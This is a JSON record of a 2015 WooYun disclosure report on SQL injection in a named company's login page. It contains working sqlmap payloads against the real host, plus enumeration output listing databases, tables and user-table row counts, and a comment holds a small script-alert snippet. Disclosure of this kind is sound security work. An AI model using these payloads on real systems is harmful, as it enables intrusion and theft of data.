{"id": 27212, "wybug_id": "wooyun-2015-0126509", "wybug_title": "江中集团某系统存在SQL注入漏洞", "wybug_corp": "江中集团", "wybug_author": "浮萍", "wybug_date": "2015-07-13 17:20", "wybug_open_date": "2015-08-28 14:12", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向公众公开  简要描述： SQL注入 详细说明：  http://login.jzjt.com/login.jsp用户名输入'\n\n\n\n抓包\nhttp://login.jzjt.com/login.jsp?R1.x=25&R1.y=25&passwd=a&refer=%2Femail.jsp&userid=a*\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a' AND 9942=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(121)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (9942=9942) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(110)+CHAR(121)+CHAR(113))) AND 'Lvht'='Lvht    Type: UNION query    Title: Generic UNION query (NULL) - 23 columns    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(121)+CHAR(106)+CHAR(113)+CHAR(78)+CHAR(115)+CHAR(71)+CHAR(108)+CHAR(72)+CHAR(77)+CHAR(85)+CHAR(102)+CHAR(89)+CHAR(87)+CHAR(113)+CHAR(106)+CHAR(110)+CHAR(121)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a' WAITFOR DELAY '0:0:5'-----[17:12:39] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000\n当前库\nweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000[17:13:10] [INFO] fetching current databasecurrent database:    'JzWeb'\n   漏洞证明：  注入点\nhttp://login.jzjt.com/login.jsp?R1.x=25&R1.y=25&passwd=a&refer=%2Femail.jsp&userid=a*\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a' AND 9942=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(121)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (9942=9942) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(110)+CHAR(121)+CHAR(113))) AND 'Lvht'='Lvht    Type: UNION query    Title: Generic UNION query (NULL) - 23 columns    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(121)+CHAR(106)+CHAR(113)+CHAR(78)+CHAR(115)+CHAR(71)+CHAR(108)+CHAR(72)+CHAR(77)+CHAR(85)+CHAR(102)+CHAR(89)+CHAR(87)+CHAR(113)+CHAR(106)+CHAR(110)+CHAR(121)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://login.jzjt.com:80/login.jsp?R1.x=35&R1.y=52&passwd=a&refer=email.jsp&userid=a' WAITFOR DELAY '0:0:5'-----[17:12:39] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000\n数据库\navailable databases [10]:[*] JzWeb[*] lumigent[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb[*] YC_SmartCard[*] ysbx_zj\n当前库\ncurrent database:    'JzWeb'\n表\nDatabase: JzWeb[277 tables]\n部分表\n| temp_usr            || tmp_usr             || usr1                || usr_dep             || usr_dep             || usr_func            || usr_inf             || usr_level           || usr_mail_info       || usr_roll            || usr_std_level       || usr_table           || v_afr_log           || v_cgdetail          || vaframt             || vendor_data         || wjdc_jsp            || wlb_audit           || wldc2013            || wldc2013            || workflow            || xjlZB               || xjllb_qm            || xjllb_qm            || xjllb_qm            |\n\nselect count(*) from acount;:    '138'select count(*) from usr1;:    '930'\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-07-14 14:11 厂商回复： 非常感谢发现漏洞，我公司信息人员正在处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-19 00:19 |    \t\t苏安泽 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:25        | 敢不敢关注一下，<script>alert('关注成功'...)\t\t \n  挖到这样的厂商真是命苦啊。SQL注入就5个rank    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}